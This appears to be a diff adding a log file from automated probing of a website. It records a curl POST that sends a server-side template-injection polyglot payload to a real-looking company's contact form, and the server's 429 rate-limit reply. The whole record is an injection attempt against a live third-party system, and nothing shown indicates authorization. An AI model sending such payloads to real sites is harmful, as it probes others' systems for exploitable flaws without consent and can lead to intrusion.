@@ -1,0 +1,8 @@
+# command: timeout 20 curl -s -m 18 -o - -w '\nHTTP_STATUS:%{http_code}\nCTYPE:%{content_type}' -X POST -H 'Content-Type: application/json' -d '{"x": "{{484*491}}${484*491}#{484*491}<%=484*491%>"}' https://www.infinitycapital.bh/contact
+# exit_code: 0
+# ---
+
+{"error":{"code":"429","message":"Too Many Requests","id":"bom1::xgd8m-1790723374383-5c9b8681900d"}}
+
+HTTP_STATUS:429
+CTYPE:application/json
